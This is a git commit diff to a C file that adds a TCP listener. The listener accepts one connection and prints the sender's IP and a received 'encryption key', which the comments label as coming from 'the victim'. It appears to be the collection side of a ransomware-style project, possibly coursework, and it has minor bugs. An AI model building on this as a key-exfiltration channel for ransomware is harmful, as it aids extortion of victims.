ca995efb04f5902c2f821caa0a2082b4dd8404d5
kitsensas <83115131+humag18@users.noreply.github.com>
2022-12-31 07:40:26 -0500

    communication bi directionnel

--- client.c
+++ client.c
@@ -34,4 +34,44 @@ int main (void){
     close(sockid);
     
     
+    int sockid2;
+    
+    
+    sockid2 = socket(AF_INET, SOCK_STREAM, 0);
+
+    struct sockaddr_in server_addr2, client_addr2;
+    server_addr2.sin_family = AF_INET;
+    server_addr2.sin_port = htons(server_port);
+    server_addr2.sin_addr.s_addr = INADDR_ANY;
+
+    char *buffer[BUFFER_SIZE];
+    int n, client_socket;
+    int bind_result = bind(sockid2, (const struct sockaddr *)&server_addr2, sizeof(server_addr2));
+
+    if(bind_result<0){
+        printf("Error during binding");
+    }
+    else {
+        printf("server listening");
+        n = listen(sockid2, 1);
+        if (n < 0) {
+            printf("Error during listen()\n");
+            handle_error();
+        }
+        int len = sizeof(client_addr2);
+        client_socket = accept(sockid2, (struct sockaddr *) &client_addr2, &len);
+
+        if (client_socket < 0) {
+            printf("Error during accept");
+            handle_error();
+        }
+        printf("Accept connection from %s\n", inet_ntoa(client_addr2.sin_addr)); //affichage de l'adresse ip de la victime
+        n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);
+
+        printf("key = %s\n",(char *)buffer);
+        //reception et affichage de la clé de chiffrage
+
+    }
+    close(sockid);
+    
 }
